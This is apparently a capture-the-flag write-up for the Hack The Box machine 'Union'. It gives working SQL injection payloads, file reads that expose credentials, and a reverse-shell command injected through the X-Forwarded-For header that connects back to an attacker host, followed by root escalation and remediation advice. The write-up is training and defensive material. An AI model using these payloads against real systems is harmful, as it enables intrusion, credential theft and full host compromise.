Hack The Box / Medium / Linux

Union

Union exposes a single nginx service on port 80 running a PHP tournament application. The player parameter of index.php is vulnerable to SQL injection, but server-side filters defeat automated tooling, so UNION statements were crafted manually to enumerate the schema, dump a flag value and then read files with load_file(). The application's PHP configuration disclosed MySQL credentials that were reused to log in over SSH, a port opened earlier by submitting the extracted flag. Once on the host, the source of firewall.php showed the X-Forwarded-For header is concatenated into a shell command, enabling command injection and a reverse shell as www-data, whose sudo rights then granted root.

Retired · Authorized laboratory assessment · Reviewed: 2025-03-05

Dylan Senez / D4RKGUNN3R

Web SQL injection with WAF filters, manual UNION extraction, PHP config credential disclosure, SSH access, X-Forwarded-For command injection, excessive sudo privileges

Case overview

Outcome

Shell as www-data via X-Forwarded-For command injection, escalated to root through a NOPASSWD ALL sudo rule.

Key takeaway

A filtered SQL injection is not a mitigated SQL injection: manual UNION statements bypassed the WAF and disclosed both a flag and the application's database credentials, while trust in the client-supplied X-Forwarded-For header turned an IP-whitelisting feature into OS command injection.

Validated steps were directly reproduced. Documented steps are supported by preserved artifacts. Staged steps remain incomplete or await evidence.

Attack path

  • Nmap (80 nginx) -> index.php player SQL injection -> manual UNION extraction of INFORMATION_SCHEMA (november DB) -> dump players and flag tables -> submit flag on challenge.php (opens SSH) -> load_file of /etc/passwd and /var/www/html/config.php -> SSH as uhc -> user proof -> read firewall.php source -> X-Forwarded-For command injection -> reverse shell as www-data -> sudo -l (NOPASSWD ALL) -> sudo /bin/bash -> root proof.

1. Reconnaissance — Full TCP scan with service detection

Validated · Kali / attacker · EVD-001

Artifact

Nmap scan output

Command / request

nmap -sV -sC -p- -T4 198.51.100.20 --min-rate 10000 -oA Union

Observed result

Single open port: 80/tcp http nginx 1.18.0 (Ubuntu); http-server-header nginx/1.18.0 (Ubuntu); PHPSESSID cookie without the httponly flag; page has no title. 65534 tcp ports filtered.

Analysis

The attack surface is a single PHP web application; the missing httponly flag and the absence of SSH stand out. Only web exploitation can open further access.

Why this mattered

Confirms that the assessment must begin and focus on the web tier.

2. Reconnaissance — Baseline request to the application

Validated · Kali / attacker · EVD-002

Artifact

curl verbose output

Command / request

curl -v -s 198.51.100.20/index.php -d "player=pencer"

Observed result

HTTP/1.1 200 OK from nginx; a PHPSESSID cookie was issued; the body returned "Congratulations pencer you may compete in this tournament!" plus a link to /challenge.php.

Analysis

The player parameter is reflected into the response, giving a clear signal for legitimate and injected requests; this is the parameter to test.

Why this mattered

Establishes baseline behaviour needed to interpret the effect of an injection payload.

3. Exploitation — Confirm SQL injection and bypass filters with manual UNION

Validated · Kali / attacker · EVD-003

Artifact

curl output showing schema dump

Command / request

curl -s 198.51.100.20/index.php -d "player=pencer' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'

Observed result

A single quote plus comment terminator altered the query logic and a UNION SELECT returned the schema list: mysql, information_schema, performance_schema, sys, november.

Analysis

Filters blocked automated dumping, but hand-crafted UNION statements executed, so the injection is viable and the application database is november.

Why this mattered

Establishes the injection technique and target schema to work against.

4. Exploitation — Enumerate tables and columns in the application database

Validated · Kali / attacker · EVD-004

Artifact

curl output showing table/column dump

Command / request

curl -s 198.51.100.20/index.php -d "player=pencer' union select group_concat('TABLE:',TABLE_NAME,'---->-COLUMN:',COLUMN_NAME,'\n') from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = 'november' -- -" | sed 's/Sorry, //' | sed 's/,//' | sed 's/ you are not eligible due to already qualifying.//'

Observed result

Tables and columns recovered: flag (column one) and players (column player).

Analysis

The flag table's single column holds the value the application expects at challenge.php; the players table lists qualifying players.

Why this mattered

Identifies exactly which table and column contain the flag and player data.

5. Exploitation — Dump the flag and player data

Validated · Kali / attacker · EVD-005

Artifact

curl output showing dumped values

Command / request

curl -s 198.51.100.20/index.php -d "player=pencer' union select group_concat(one) from flag -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'

Observed result

The players table returned ippsec, celesian, big0us, luska, tinyboy; the flag table returned a flag value (redacted).

Analysis

Full read of application data achieved purely through UNION injection, including the qualifying flag used as a submission token.

Why this mattered

Provides the token required to trigger server-side behaviour on challenge.php.

6. Exploitation — Submit the extracted flag to open SSH

Validated · Kali / attacker · EVD-006

Artifact

curl output with SSH banner

Command / request

curl -s -X POST -b 'PHPSESSID=[REDACTED]' --data-binary 'flag=[REDACTED]' 'http://198.51.100.20/challenge.php' -L | grep SSH

Observed result

Posting the flag with the issued session cookie caused the server to run its iptables whitelisting step; the previously filtered port 22 then became available and returned an SSH banner.

Analysis

A valid application submission triggers a privileged server-side action that changes the firewall, converting a web-only target into an SSH-reachable one.

Why this mattered

Unlocks the transport needed for the next stage of access.

7. Exploitation — Read local files through SQL injection

Validated · Kali / attacker · EVD-007

Artifact

curl output of /etc/passwd and config.php

Command / request

curl -s 198.51.100.20/index.php -d "player=pencer' union select load_file('/var/www/html/config.php') -- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'

Observed result

load_file('/etc/passwd') disclosed root, htb and uhc (all /bin/bash); load_file('/var/www/html/config.php') disclosed the MySQL connection block with $username "uhc" and a plaintext $password (redacted) for database november.

Analysis

The injection reads arbitrary files, and the PHP configuration exposes reusable database credentials for the local uhc account, which matches the SSH-capable system account in /etc/passwd.

Why this mattered

Yields the credential needed for interactive SSH access.

8. Initial Access — SSH as uhc and recover the user proof

Validated · Kali / attacker · EVD-008

Artifact

SSH session output

Command / request

ssh uhc@198.51.100.20

Observed result

Authenticated with the disclosed password onto Ubuntu 20.04.3 LTS (kernel 5.4.0-77-generic). user.txt was present in the home directory and read (redacted), and the source of /var/www/html/firewall.php was reviewed.

Analysis

The database credential doubles as a system credential, granting an interactive foothold and access to application source that reveals the next vulnerability.

Why this mattered

Provides the user-level proof and local visibility into the web application source.

9. Privilege Escalation — Command injection via X-Forwarded-For in firewall.php

Validated · Kali / attacker · EVD-009

Artifact

firewall.php source and reverse-shell session

Command / request

curl -X GET -H 'X-FORWARDED-FOR: ;bash -c "bash -i >& /dev/tcp/198.51.100.30/1337 0>&1";' --cookie "PHPSESSID=[REDACTED]" 'http://198.51.100.20/firewall.php'

Observed result

A netcat listener on the attacker host received a connection from the target and the shell landed as www-data in /var/www/html. The source confirmed the vulnerable logic: $ip is taken from $_SERVER['HTTP_X_FORWARDED_FOR'] and concatenated into system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT").

Analysis

The client-controlled X-Forwarded-For value is placed directly into a shell command, so a payload beginning with a command separator executes arbitrary commands as the web server user.

Why this mattered

Converts a web-tier header-injection flaw into a remote reverse shell.

10. Privilege Escalation — Escalate to root via an over-broad sudo rule

Validated · Kali / attacker (www-data shell) · EVD-010

Artifact

sudo -l output and root shell

Command / request

sudo -l ; sudo /bin/bash ; id ; cat /root/root.txt

Observed result

sudo -l showed that www-data may run the following commands on union: (ALL : ALL) NOPASSWD: ALL. Running sudo /bin/bash returned uid=0(root) gid=0(root), and root.txt was read (redacted).

Analysis

The web service account is permitted unrestricted passwordless sudo, so the command-injection shell escalates to root immediately without any further exploit.

Why this mattered

Finalises privilege escalation and supplies the root proof.

Findings & remediation

F-1 — UNION-based SQL injection in the player parameter of index.php

High · Validated · http://198.51.100.20/index.php

Description

The player POST parameter is concatenated into a backend SQL query without adequate sanitisation. Filters block automated dumping tools but do not prevent manually crafted UNION statements.

Impact

Complete read access to the application database, including player data and the qualifying flag, plus arbitrary file reads via load_file() that disclosed OS files and the PHP configuration.

Root cause

Unparameterised SQL query construction combined with a filter approach that only obstructs automation instead of fixing the injection.

Remediation

  • Use parameterised/prepared statements for all database access and retire the filter-based mitigation in favour of proper query handling.

Validation

  • Manual UNION SELECT statements returned the schema list (including november), enumerated the flag/players tables and columns, dumped their values, and used load_file() to read /etc/passwd and config.php.

F-2 — Reusable database credentials exposed in PHP configuration

High · Validated · /var/www/html/config.php

Description

The application configuration stores a plaintext MySQL username (uhc) and password. The same credential authenticates the host-level uhc account, so disclosing the config grants system access.

Impact

Interactive SSH access to the host as uhc, exposing the user proof and the web application source code.

Root cause

Plaintext reusable credentials stored in application configuration combined with credential reuse across database and system accounts.

Remediation

  • Keep credentials out of source/config files, use dedicated least-privilege database users, and enforce unique secrets per service so a database credential cannot authenticate a system account.

Validation

  • load_file('/var/www/html/config.php') via the SQL injection returned the plaintext connection block; those credentials authenticated an SSH session as uhc.

F-3 — OS command injection via the X-Forwarded-For header in firewall.php

Critical · Validated · http://198.51.100.20/firewall.php

Description

firewall.php reads $_SERVER['HTTP_X_FORWARDED_FOR'] and concatenates it directly into system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT"), so a header value containing a command separator runs arbitrary commands.

Impact

Remote code execution as the web server user (www-data), which was the pivot for full host compromise.

Root cause

Trusting a client-controllable header in a security decision and concatenating it into a shell command without escaping or validation.

Remediation

  • Never trust X-Forwarded-For for security logic; validate input strictly against an IP format and avoid shell invocation entirely by using a language-level firewall API or escaped argument lists.

Validation

  • A curl request with a crafted X-Forwarded-For value produced a reverse shell as www-data; the application source was retrieved over SSH and confirmed the concatenation.

F-4 — Web service account has unrestricted passwordless sudo

High · Validated · www-data account on the Union host

Description

sudo -l reported that www-data may run the following commands on union: (ALL : ALL) NOPASSWD: ALL, allowing any command as root without a password.

Impact

Any compromise of the web user escalates immediately to full root control of the host.

Root cause

An over-broad sudoers entry granting the service account full, passwordless privilege instead of the minimal commands required.

Remediation

  • Scope sudoers entries to the specific commands the application needs, remove NOPASSWD where not strictly required, and run web services under a least-privilege account.

Validation

  • Following the command-injection shell, sudo -l showed NOPASSWD ALL and sudo /bin/bash returned uid=0(root), after which /root/root.txt was read.

Analysis

The host chains three weaknesses: a UNION-based SQL injection whose filters only obstruct automation, application source (PHP config) that reveals reusable database credentials, and a client-controlled header (X-Forwarded-For) concatenated into a shell command. The SQLi supplied everything needed to reach SSH, and the header injection converted a web-tier flaw into remote code execution, after which an over-broad sudo rule finished the escalation.

Remediation

  • Use parameterised queries, replace manual string concatenation when building shell commands and never trust X-Forwarded-For for security decisions, remove reusable credentials from application configuration in favour of scoped database users, and restrict www-data to no sudo rights instead of NOPASSWD ALL.

Defender perspective

Detect SQLi by watching for UNION SELECT and INFORMATION_SCHEMA access in web logs, alert on requests whose X-Forwarded-For value contains shell metacharacters, and audit sudoers for broad NOPASSWD rules on service accounts.

Detection opportunities

  • Web logs showing UNION-based payloads and load_file calls, firewall.php requests carrying shell metacharacters in X-Forwarded-For, and suspicious sudo -l / sudo /bin/bash activity from www-data.

Lessons learned

  • WAF filters are a speed bump, not a fix, and manual UNION craft defeated them. Application configuration files are a common credential source when combined with file-read SQLi, and IP-whitelisting logic that trusts a header is a direct command-injection sink.

Open questions

  • None material; the retained evidence covers reconnaissance, initial access, SSH access, privilege escalation and both proofs.

Troubleshooting & success factors

  • Automated dumping (SQLMap) was blocked by the application's filters, so every UNION statement had to be built by hand and its output cleaned with sed to strip the wrapper text. The reverse-shell payload had to be delivered through the X-Forwarded-For header so the concatenated system() command would execute it.
